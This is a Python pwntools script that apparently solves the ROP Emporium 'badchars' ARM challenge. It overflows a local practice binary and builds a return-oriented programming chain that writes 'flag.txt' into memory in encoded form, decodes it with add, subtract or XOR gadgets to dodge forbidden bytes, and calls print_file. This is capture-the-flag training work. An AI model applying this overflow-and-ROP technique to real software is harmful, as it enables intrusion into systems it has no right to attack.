from pwn import *

BINARY = "./badchars_armv5-hf"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

"""
BAD CHARS = '.', 'a', 'g', 'x'
--> 0x2e, 0x61, 0x67, 0x78

SUBSTRACTION GADGET
-----------------------------------------------------
   105f0:	e5951000 	ldr	r1, [r5]
   105f4:	e0411006 	sub	r1, r1, r6
   105f8:	e5851000 	str	r1, [r5]
   105fc:	e8bd8001 	pop	{r0, pc}

ADDITION GADGET
-----------------------------------------------------
   10600:	e5951000 	ldr	r1, [r5]
   10604:	e0811006 	add	r1, r1, r6
   10608:	e5851000 	str	r1, [r5]
   1060c:	e8bd8001 	pop	{r0, pc}

STORING GADGET
-----------------------------------------------------
   10610:	e5843000 	str	r3, [r4]
   10614:	e8bd8060 	pop	{r5, r6, pc}

XORING GADGET
-----------------------------------------------------
   10618:	e5951000 	ldr	r1, [r5]
   1061c:	e0211006 	eor	r1, r1, r6
   10620:	e5851000 	str	r1, [r5]
   10624:	e8bd8001 	pop	{r0, pc}
"""

XORING_GADGET       = p32(0x10618)
STORING_GADGET      = p32(0x10610)
ADDITION_GADGET     = p32(0x10600)
SUBSTRACTION_GADGET = p32(0x105f0) 

pop_r3_pc                   = p32(0x10484) # pop {r3, pc}
pop_r4_pc                   = p32(0x105b0) # pop {r4, pc}
bl_print_file               = p32(0x105e0) # bl print_file --> works with 0x104c0 <print_file@plt>
data_adr                    = 0x21024

PAYLOAD_CHOICE = int(input("[!] Wich payload do you want to use ?\n\n1) Addition gadget\n2) Substraction gadget\n3) XORing gadget\n\n--> Your choice : "))

if PAYLOAD_CHOICE not in [1, 2, 3]:
    print("[-] Bad choice")
    exit(1)

rop = b"A" * 44

rop += pop_r3_pc

if PAYLOAD_CHOICE == 1 :
    rop += b"dj_e" # "flag" - 2 on each letter
elif PAYLOAD_CHOICE == 2 :
    rop += b'hnci' # "flag" + 2 on each letter
elif PAYLOAD_CHOICE == 3 :
    rop += b'dnce' # "flag" ^ 2 on each letter

rop += pop_r4_pc
rop += p32(data_adr)

rop += STORING_GADGET
rop += p32(data_adr) # r5
rop += p32(0x02020202) # r6

if PAYLOAD_CHOICE == 1 :
    rop += ADDITION_GADGET
elif PAYLOAD_CHOICE == 2 :
    rop += SUBSTRACTION_GADGET
elif PAYLOAD_CHOICE == 3 :
    rop += XORING_GADGET

rop += b'BBBB'

rop += pop_r3_pc

if PAYLOAD_CHOICE == 1 :
    rop += b",rvr" # ".txt" - 2 on each letter
elif PAYLOAD_CHOICE == 2 :
    rop += b'0vzv' # ".txt" + 2 on each letter
elif PAYLOAD_CHOICE == 3 :
    rop += b',vzv' # ".txt" ^ 2 on each letter

rop += pop_r4_pc
rop += p32(data_adr + 4)

rop += STORING_GADGET
rop += p32(data_adr + 4)
rop += p32(0x02020202)

if PAYLOAD_CHOICE == 1 :
    rop += ADDITION_GADGET
elif PAYLOAD_CHOICE == 2 :
    rop += SUBSTRACTION_GADGET
elif PAYLOAD_CHOICE == 3 :
    rop += XORING_GADGET

rop += p32(data_adr)
rop += bl_print_file

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
